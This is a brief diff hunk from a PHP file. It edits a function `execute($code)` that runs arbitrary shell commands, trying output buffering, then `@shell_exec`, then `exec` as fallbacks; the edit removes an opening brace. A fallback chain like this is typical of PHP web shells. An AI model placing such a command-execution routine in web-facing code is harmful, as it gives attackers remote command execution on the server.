@@ -9,7 +9,7 @@ function execute($code){
 		$output = ob_get_contents();
 		ob_end_clean();	
 	}
-	elseif(is_callable('shell_exec')){
+	elseif(is_callable('shell_exec'))
 		$output = @shell_exec($code);
 			
 	elseif(is_callable('exec'))
